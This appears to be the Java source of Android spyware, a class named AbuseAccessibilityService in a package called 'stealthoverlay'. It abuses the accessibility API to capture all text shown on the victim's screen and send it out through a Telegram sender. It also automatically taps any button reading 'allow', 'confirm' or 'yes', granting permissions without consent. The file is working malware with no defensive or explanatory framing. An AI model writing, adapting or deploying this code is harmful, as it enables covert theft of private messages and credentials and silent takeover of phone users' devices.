package com.example.stealthoverlay;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.List;

public class AbuseAccessibilityService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        AccessibilityNodeInfo nodeInfo = event.getSource();
        if (nodeInfo != null) {
            // Read all visible text
            List<CharSequence> textList = event.getText();
            for (CharSequence text : textList) {
                TelegramSender.send("🕵️ Text detected on screen: " + text.toString());
            }

            // Try to click 'Allow' or 'Confirm' buttons automatically
            CharSequence className = event.getClassName();
            if (nodeInfo.getText() != null) {
                String btnText = nodeInfo.getText().toString().toLowerCase();
                if (btnText.contains("allow") || btnText.contains("confirm") || btnText.contains("yes")) {
                    nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    TelegramSender.send("✅ Button clicked automatically: " + btnText);
                }
            }
        }
    }

    @Override
    public void onInterrupt() {
        // Not used
    }
}
